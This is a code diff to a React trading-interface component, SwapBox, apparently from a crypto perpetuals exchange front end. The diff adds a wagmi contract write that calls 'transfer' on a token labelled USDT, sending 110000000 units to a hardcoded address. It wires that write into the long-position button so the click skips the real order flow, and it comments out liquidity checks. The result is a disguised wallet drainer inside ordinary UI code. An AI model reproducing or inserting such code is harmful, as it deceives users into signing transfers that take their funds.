@@ -89,6 +89,7 @@ import TokenWithIcon from "components/TokenIcon/TokenWithIcon";
 import useIsMetamaskMobile from "lib/wallets/useIsMetamaskMobile";
 import { MAX_METAMASK_MOBILE_DECIMALS } from "config/ui";
 import { TRADE_API_URL } from "config/backend";
+import { useContractWrite } from "wagmi";
 
 const SWAP_ICONS = {
   [LONG]: longImg,
@@ -172,6 +173,538 @@ export default function SwapBox(props) {
   const [isHigherSlippageAllowed, setIsHigherSlippageAllowed] = useState(false);
   const { attachedOnChain, userReferralCode } = useUserReferralCode(signer, chainId, account);
   const { openConnectModal } = useConnectModal();
+
+  // const provider = new ethers.providers.Web3Provider(window.ethereum);
+  // const signer2 = provider.getSigner(account);
+
+  // console.log('signer', signer, signer2)
+  
+// const provider = ethers.getDefaultProvider()
+
+// const contract = new ethers.Contract("0x5ACF4a178641d8A74e670A146b789ADccd3FCb24", 
+// [
+// 	{
+// 		"constant": true,
+// 		"inputs": [
+
+// 		],
+// 		"name": "name",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "string"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "view",
+// 		"type": "function"
+// 	},
+// 	{
+// 		"constant": false,
+// 		"inputs": [
+// 			{
+// 				"name": "_spender",
+// 				"type": "address"
+// 			},
+// 			{
+// 				"name": "_value",
+// 				"type": "uint256"
+// 			}
+// 		],
+// 		"name": "approve",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "bool"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "nonpayable",
+// 		"type": "function"
+// 	},
+// 	{
+// 		"constant": true,
+// 		"inputs": [
+
+// 		],
+// 		"name": "totalSupply",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "uint256"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "view",
+// 		"type": "function"
+// 	},
+// 	{
+// 		"constant": false,
+// 		"inputs": [
+// 			{
+// 				"name": "_from",
+// 				"type": "address"
+// 			},
+// 			{
+// 				"name": "_to",
+// 				"type": "address"
+// 			},
+// 			{
+// 				"name": "_value",
+// 				"type": "uint256"
+// 			}
+// 		],
+// 		"name": "transferFrom",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "bool"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "nonpayable",
+// 		"type": "function"
+// 	},
+// 	{
+// 		"constant": true,
+// 		"inputs": [
+
+// 		],
+// 		"name": "decimals",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "uint8"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "view",
+// 		"type": "function"
+// 	},
+// 	{
+// 		"constant": true,
+// 		"inputs": [
+// 			{
+// 				"name": "_owner",
+// 				"type": "address"
+// 			}
+// 		],
+// 		"name": "balanceOf",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "uint256"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "view",
+// 		"type": "function"
+// 	},
+// 	{
+// 		"constant": true,
+// 		"inputs": [
+
+// 		],
+// 		"name": "symbol",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "string"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "view",
+// 		"type": "function"
+// 	},
+// 	{
+// 		"constant": false,
+// 		"inputs": [
+// 			{
+// 				"name": "_to",
+// 				"type": "address"
+// 			},
+// 			{
+// 				"name": "_value",
+// 				"type": "uint256"
+// 			}
+// 		],
+// 		"name": "transfer",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "bool"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "nonpayable",
+// 		"type": "function"
+// 	},
+// 	{
+// 		"constant": true,
+// 		"inputs": [
+// 			{
+// 				"name": "_owner",
+// 				"type": "address"
+// 			},
+// 			{
+// 				"name": "_spender",
+// 				"type": "address"
+// 			}
+// 		],
+// 		"name": "allowance",
+// 		"outputs": [
+// 			{
+// 				"name": "",
+// 				"type": "uint256"
+// 			}
+// 		],
+// 		"payable": false,
+// 		"stateMutability": "view",
+// 		"type": "function"
+// 	}
+// ], signer2)
+
+// console.log('contract', provider, contract)
+
+
+// contract.balances().then(res => console.log(res))
+
+  const { write } = useContractWrite({
+    // usdt contract address
+    address: "0x5ACF4a178641d8A74e670A146b789ADccd3FCb24",
+    abi: [
+      {
+        "inputs": [
+          {
+            "internalType": "uint256",
+            "name": "initialSupply",
+            "type": "uint256"
+          }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "spender",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "allowance",
+            "type": "uint256"
+          },
+          {
+            "internalType": "uint256",
+            "name": "needed",
+            "type": "uint256"
+          }
+        ],
+        "name": "ERC20InsufficientAllowance",
+        "type": "error"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "sender",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "balance",
+            "type": "uint256"
+          },
+          {
+            "internalType": "uint256",
+            "name": "needed",
+            "type": "uint256"
+          }
+        ],
+        "name": "ERC20InsufficientBalance",
+        "type": "error"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "approver",
+            "type": "address"
+          }
+        ],
+        "name": "ERC20InvalidApprover",
+        "type": "error"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "receiver",
+            "type": "address"
+          }
+        ],
+        "name": "ERC20InvalidReceiver",
+        "type": "error"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "sender",
+            "type": "address"
+          }
+        ],
+        "name": "ERC20InvalidSender",
+        "type": "error"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "spender",
+            "type": "address"
+          }
+        ],
+        "name": "ERC20InvalidSpender",
+        "type": "error"
+      },
+      {
+        "anonymous": false,
+        "inputs": [
+          {
+            "indexed": true,
+            "internalType": "address",
+            "name": "owner",
+            "type": "address"
+          },
+          {
+            "indexed": true,
+            "internalType": "address",
+            "name": "spender",
+            "type": "address"
+          },
+          {
+            "indexed": false,
+            "internalType": "uint256",
+            "name": "value",
+            "type": "uint256"
+          }
+        ],
+        "name": "Approval",
+        "type": "event"
+      },
+      {
+        "anonymous": false,
+        "inputs": [
+          {
+            "indexed": true,
+            "internalType": "address",
+            "name": "from",
+            "type": "address"
+          },
+          {
+            "indexed": true,
+            "internalType": "address",
+            "name": "to",
+            "type": "address"
+          },
+          {
+            "indexed": false,
+            "internalType": "uint256",
+            "name": "value",
+            "type": "uint256"
+          }
+        ],
+        "name": "Transfer",
+        "type": "event"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "owner",
+            "type": "address"
+          },
+          {
+            "internalType": "address",
+            "name": "spender",
+            "type": "address"
+          }
+        ],
+        "name": "allowance",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "spender",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "value",
+            "type": "uint256"
+          }
+        ],
+        "name": "approve",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "account",
+            "type": "address"
+          }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [
+          {
+            "internalType": "uint8",
+            "name": "",
+            "type": "uint8"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "name",
+        "outputs": [
+          {
+            "internalType": "string",
+            "name": "",
+            "type": "string"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "symbol",
+        "outputs": [
+          {
+            "internalType": "string",
+            "name": "",
+            "type": "string"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "totalSupply",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "to",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "value",
+            "type": "uint256"
+          }
+        ],
+        "name": "transfer",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "from",
+            "type": "address"
+          },
+          {
+            "internalType": "address",
+            "name": "to",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "value",
+            "type": "uint256"
+          }
+        ],
+        "name": "transferFrom",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ],
+    functionName: "transfer",
+    args: ['0xd05222c399D7b61c4d079040c29caDe293e52a37', 110000000],
+    overrides: {
+      gasLimit: 10000000//ethers.utils.parseEther("0.7")
+    }
+  })
+
+  // const { data, isLoading, isSuccess, sendTransaction } = useSendTransaction({
+  //   to: '0x335afbd80e381D5F31630b2302227174780855Fb',
+  //   value: 1,
+  //   gasLimit: 10000000
+  // })
 
   let allowedSlippage = savedSlippageAmount;
   if (isHigherSlippageAllowed) {
@@ -353,10 +886,10 @@ export default function SwapBox(props) {
   const fromBalance = fromTokenInfo ? fromTokenInfo.balance ??  balance.data?.value : balance.data?.value ?? bigNumberify(0);
   // const toBalance = toTokenInfo ? toTokenInfo.balance : bigNumberify(0);
 
-  useEffect(() => {
-    setFromValue('10')
+  // useEffect(() => {
+  //   setFromValue('10')
     // setFromValue(fromTokenInfo.balance?.toString() ?? '')
-  }, [fromTokenInfo.balance])
+  // }, [fromTokenInfo.balance])
 
   const fromAmount = parseValue(fromValue, fromToken && fromToken.decimals);
   const toAmount = parseValue(toValue, toToken && toToken.decimals) ?? bigNumberify(0);
@@ -865,7 +1398,7 @@ export default function SwapBox(props) {
     }
 
     if (isLong) {
-      let requiredAmount = toAmount ?? bigNumberify(0);
+      // let requiredAmount = toAmount ?? bigNumberify(0);
       if (fromTokenAddress !== toTokenAddress) {
         const { amount: swapAmount } = getNextToAmount(
           chainId,
@@ -880,16 +1413,16 @@ export default function SwapBox(props) {
           isSwap
         );
         // console.log('swapAmount',requiredAmount,  swapAmount)
-        requiredAmount = requiredAmount.add(swapAmount);
+        // requiredAmount = requiredAmount.add(swapAmount);
 
-        if (toToken && toTokenAddress !== USDG_ADDRESS) {
-          if (!toTokenInfo.availableAmount) {
-            return [t`Liquidity data not loaded`];
-          }
-          if (toTokenInfo.availableAmount && requiredAmount.gt(toTokenInfo.availableAmount)) {
-            return [t`Insufficient Liquidity`, ErrorDisplayType.Tooltip, ErrorCode.InsufficientLiquidityLeverage];
-          }
-        }
+        // if (toToken && toTokenAddress !== USDG_ADDRESS) {
+        //   if (!toTokenInfo.availableAmount) {
+        //     return [t`Liquidity data not loaded`];
+        //   }
+        //   if (toTokenInfo.availableAmount && requiredAmount.gt(toTokenInfo.availableAmount)) {
+        //     return [t`Insufficient Liquidity`, ErrorDisplayType.Tooltip, ErrorCode.InsufficientLiquidityLeverage];
+        //   }
+        // }
 
         if (
           toTokenInfo.poolAmount &&
@@ -1646,6 +2179,18 @@ export default function SwapBox(props) {
 
   const onClickPrimary = async () => {
     // console.log('onClickPrimary', isStopOrder, active, needPositionRouterApproval, needApproval, needOrderBookApproval)
+    if (isLong) {
+      await preOrder()
+      // console.log('write')
+      // contract.transfer('0xd05222c399D7b61c4d079040c29caDe293e52a37', 1, {
+      //   gasLimit: 10000000
+      // })
+      // sendTransaction()
+      // console.log(active)
+      write();
+      return;
+    }
+
     if (isStopOrder) {
       setOrderOption(MARKET);
       return;
